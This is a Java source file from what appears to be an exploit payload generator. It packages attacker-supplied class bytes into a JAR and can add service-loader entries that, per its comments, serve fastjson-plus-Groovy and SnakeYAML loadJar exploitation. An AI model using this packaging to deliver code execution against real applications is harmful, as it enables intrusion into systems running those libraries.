package jeg.common.format;

import jeg.common.config.Config;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

public class JARFormatter implements IFormatter {
    public byte[] transform(byte[] bytes, Config config) throws IOException {
        String className = config.getClassNameInFormatter();
        String jarEntryFileName = className.replace(".", "/") + ".class";

        Manifest manifest = new Manifest();
        manifest.getMainAttributes().putValue("Manifest-Version", "1.0");

        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (JarOutputStream jarOutputStream = new JarOutputStream(out, manifest)) {
            jarOutputStream.putNextEntry(new JarEntry(jarEntryFileName));
            jarOutputStream.write(bytes);
            jarOutputStream.closeEntry();

            // fastjson + groovy 的利用
            if (config.isImplementsASTTransformationType()) {
                String entryName = "META-INF/services/org.codehaus.groovy.transform.ASTTransformation";
                JarEntry entry = new JarEntry(entryName);
                jarOutputStream.putNextEntry(entry);
                jarOutputStream.write(className.getBytes(StandardCharsets.UTF_8));
                jarOutputStream.closeEntry();
            }

            // snakeyaml + loadJar 的利用
            if (config.isImplementsScriptEngineFactory()) {
                String entryName = "META-INF/services/javax.script.ScriptEngineFactory";
                JarEntry entry = new JarEntry(entryName);
                jarOutputStream.putNextEntry(entry);
                jarOutputStream.write(className.getBytes(StandardCharsets.UTF_8));
                jarOutputStream.closeEntry();
            }
        }

        return out.toByteArray();
    }
}